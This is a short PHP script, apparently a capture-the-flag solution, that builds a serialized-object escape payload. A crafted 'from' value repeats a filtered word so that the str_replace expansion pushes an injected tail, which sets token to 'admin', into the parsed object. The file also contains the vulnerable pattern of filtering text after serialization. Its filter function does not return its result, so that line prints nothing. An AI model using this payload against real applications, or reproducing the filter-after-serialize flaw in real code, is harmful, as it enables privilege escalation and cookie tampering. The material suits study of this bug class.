<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

//$m=new message('fuck','x','y');
//echo serialize($m);


//$f = $_GET['f'];
//$m = $_GET['m'];
//$t = $_GET['t'];
//
//if(isset($f) && isset($m) && isset($t)){
//    $msg = new message($f,$m,$t);
//    $umsg = str_replace('fuck', 'loveU', serialize($msg));
//    setcookie('msg',base64_encode($umsg));
//    echo 'Your message has been sent';
//}
$f='fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:3:"msg";s:1:"x";s:2:"to";s:1:"y";s:5:"token";s:5:"admin";}';
function filter($str){
    str_replace('fuck', 'loveU', $str);
}

$m=new message($f,'x','y');
echo serialize($m);
echo filter(serialize($m));